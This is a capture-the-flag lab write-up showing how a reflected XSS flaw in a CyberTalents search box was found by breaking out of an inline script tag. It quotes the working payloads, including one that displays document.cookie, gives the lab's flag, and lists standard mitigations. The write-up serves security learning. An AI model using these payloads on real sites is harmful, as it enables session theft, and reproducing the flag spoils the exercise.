# Cross-Site-Scripting-XSS-Vulnerability

## Date: November 22, 2023

## Author: Muhammad Ahmed

## Summary:
### This report details the discovery and exploitation of a Cross-Site Scripting (XSS) vulnerability found in CyberTalents. The vulnerability allowed an attacker to execute malicious scripts in the context of the victim‚Äôs browser, leading to potential unauthorized access to sensitive information, such as cookies.

## Vulnerability Type: Cross-Site Scripting (XSS)

[Affected Website:](http://wcamxwl32pue3e6meg23gr7h8v4km236rw06bgz0-web.cybertalentslabs.com/)

## Vulnerable Component:
<img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BQBr-Y_X_mAyZgeo3MpJEg.png">
## Vulnerability Description:
### The XSS vulnerability was identified in this link http://wcamxwl32pue3e6meg23gr7h8v4km236rw06bgz0-web.cybertalentslabs.com/ - where user input was not properly sanitized before being rendered on the page. This allowed an attacker to inject malicious JavaScript code executed in the victim‚Äôs browser.

## Proof of Concept:
Payloads Injection
Try writing 
```
‚Äô‚Äù‚Äôxss/()
``` 
in the search textbox you will see nothing will happen
<img src="https://miro.medium.com/v2/resize:fit:828/format:webp/1*8a8atHAaAswDgt8-WZIM5w.png">

Open the source code in a new tab, you will see this script
```
<script>var currentSearch = {'keyword':'you searched for: """xss/()'};</script>
```
Use Burp Suite to inspect the input you entered and send the request to Repeater.

Now Insert the simple payload in GET method and send the request.
```
<script>alert(1)</script>
```

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*gQ3ea5W5JnVPE6QXJ2uoTg.png">

Now we want to close the first script tag and then open a new one for alert, try it, and send the request.
```
</script> <script>alert(2)</script>
```

<img src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*ISv62QvW8b2X7xViaweSUw.png">

Good news ^_^ It works, so now try that but with cookies

```
</script><script>alert(document.cookie)</script>
```
<img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9lCakttCouLyjNPNhbroWA.png">

Now let‚Äôs copy the page response URL and open it in another tape to see the result.

<img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Qn7dnlCm9O4VilWXKtDspg.png">

Done, now you can get the flag which is coolcookie112

<img src="https://miro.medium.com/v2/resize:fit:828/format:webp/1*M351kZqZ3iTTN8vhzjli-g.png">

The task has been completed successfully üëª

## Impact:

This vulnerability posed a severe risk as it could allow an attacker to hijack user sessions, leading to unauthorized access to sensitive information or actions on behalf of the victim.

## Mitigation:

Mitigating XSS (Cross-Site Scripting) vulnerabilities is crucial to ensure the security of web applications. Here are some general mitigation techniques to prevent XSS attacks that aim to steal user cookies:
### 1. Input Validation and Sanitization:
 #### Validate and sanitize all user inputs on both client and server sides.
#### Use appropriate input validation mechanisms to allow only expected characters and formats.
 #### Reject or sanitize any input that includes potentially dangerous characters, such as <, >, /, etc.
### 2. Output Encoding:
 #### Encode user-generated content before rendering it in the browser. This helps neutralize any potential malicious scripts.
 #### HTML entities encoding, such as converting < to &lt; and > to &gt;, can be effective.
### 3. Content Security Policy (CSP):
 #### Implement and enforce a strict Content Security Policy (CSP) for your web application.
 #### Specify trusted sources for scripts, styles, and other resources to reduce the risk of executing unauthorized scripts.
### 4. HTTP-Only Cookies:
 #### Set the HTTP-only flag on cookies to prevent them from being accessed through client-side scripts.
 #### This helps protect session cookies from being stolen by malicious scripts.
### 5. Session Management Best Practices:
  Implement secure session management practices, including:
   #### Session timeout mechanisms.
   #### Regenerating session IDs after login.
  #### Using secure, random session IDs.
### 6. X-Content-Type-Options Header:
  ####Set the X-Content-Type-Options header to nosniff to prevent browsers from interpreting files as a different MIME type.
 #### This can help prevent certain types of XSS attacks.
### 7. Security Libraries and Frameworks:
 #### Use security libraries and frameworks that offer built-in protection against XSS vulnerabilities.
 #### Many web frameworks provide features like automatic output encoding to help developers prevent XSS.
### 8. Regular Security Audits and Testing:
 #### Conduct regular security audits, including code reviews and automated testing, to identify and address potential vulnerabilities.
 #### Perform dynamic security testing, including penetration testing and vulnerability scanning.
### 9. Educate Developers:
 #### Provide training and education to developers on secure coding practices, especially in regard to input validation and output encoding.
 #### Raise awareness about the risks associated with XSS attacks.
### 10. Web Application Firewall (WAF):
 #### Deploy a Web Application Firewall that can detect and block malicious traffic, including attempts to exploit XSS vulnerabilities.
 #### Configure the WAF to filter and block known attack patterns.

                                

### By combining these techniques, web developers and security teams can significantly reduce the risk of XSS attacks and protect user data, including cookies, from being compromised. It‚Äôs important to stay vigilant and keep up with evolving security best practices.

## Useful reading ... ^-^
